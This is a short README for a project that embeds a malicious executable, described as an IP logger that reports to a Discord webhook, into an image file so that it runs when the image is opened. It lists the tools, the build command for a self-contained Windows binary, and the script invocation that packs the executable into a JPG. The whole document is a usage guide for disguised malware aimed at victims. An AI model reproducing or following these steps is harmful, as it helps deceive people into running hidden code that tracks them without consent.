## Introduction
This project attempts to embed a malicious executable into an image file, such that the executable, in this case, a simple IP logger, is run whenever the image is opened.

## Requirements

1. Download [WinRAR](https://www.rarlab.com/download.htm?source=post_page-----81ee5339707e---------------------------------------) and [ImageMagick](https://imagemagick.org/script/download.php), and add the WinRAR folder to the system environment variables

2. Install the dependencies
```
pip install wand
dotnet build
```

## Usage

1. Add your discord webhook in `Program.cs` and compile with
```
dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -p:EnableCompressionInSingleFile=true -o dist
```
2. Run `exe2img.py` to embed the executable into an image
```
python exe2img.py -e your_executable.exe -i your_image.jpg
```
